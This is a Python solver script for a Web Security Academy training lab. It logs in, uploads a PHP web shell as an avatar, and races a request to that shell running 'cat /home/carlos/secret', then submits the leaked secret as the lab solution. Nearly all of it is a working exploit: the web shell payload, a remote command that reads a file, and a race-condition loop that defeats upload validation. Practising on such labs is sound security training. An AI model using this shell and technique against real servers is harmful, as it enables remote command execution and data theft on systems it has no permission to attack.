from web_security_academy.core.logger import logger
from web_security_academy.core.async_lab_session import AsyncLabSession

import asyncio


def solve_lab(session):
    asyncio.run(solve_lab_async(session))


async def solve_lab_async(session):
    async with AsyncLabSession(session) as session:
        await session.login("wiener", "peter")

        csrf = await session.get_csrf_token("/my-account")
        files = {"avatar": ("shell.php", '<?php echo SYSTEM($_GET["cmd"])?>')}
        data = {"user": "wiener", "csrf": csrf}
        logger.info("Attempting to call uploaded web shell via race condition...")

        for i in range(10):
            # Simultaneously upload and call web shell
            resp = await asyncio.gather(
                session.post_path("/my-account/avatar", files=files, data=data),
                session.get_path(
                    "/files/avatars/shell.php?cmd=cat /home/carlos/secret"
                ),
            )
            if resp[1].status_code != 404:
                logger.success(f"Attempt #{i+1:02}: {resp[1].text}")
                break
            logger.info(f"Attempt #{i+1:02}: 404 Not Found")
        else:
            logger.fail("Unable to cause race condition.")
            return

        text = resp[1].text

        # For some reason, the secret file is printed twice in the HTTP response.
        answer = text[: (len(text) // 2)]
        await session.submit_solution(answer)
